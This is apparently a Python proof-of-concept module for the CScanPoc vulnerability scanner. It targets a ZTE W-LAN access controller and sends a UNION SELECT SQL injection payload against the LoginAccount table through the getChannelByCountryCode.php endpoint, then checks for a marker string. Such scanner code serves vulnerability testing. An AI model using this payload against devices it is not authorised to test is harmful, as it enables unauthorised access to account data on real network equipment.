# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ZTE_0007'  # 平台漏洞编号，留空
    name = '中兴W-LAN无线接入控制器信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
       中兴W-LAN无线接入控制器从信息泄露到cmdshell
    '''  # 漏洞描述
    ref = 'http://blog.knownsec.com/2015/01/analysis-of-zte-soho-routerweb_shell_cmd-gch-remote-command-execution/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = '中兴W-LAN无线接入控制器'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '36701094-e475-450d-84a9-1f8608e2979a'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/apgroup/getChannelByCountryCode.php"
            url = arg + payload
            postpayload = "CountryCode=' union select 'testvul' || '|'  || 'vulnerable' from LoginAccount --"
            code, head, res, errcode, _ = hh.http(url, postpayload)
            if code == 200 and 'testvul|vulnerable' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
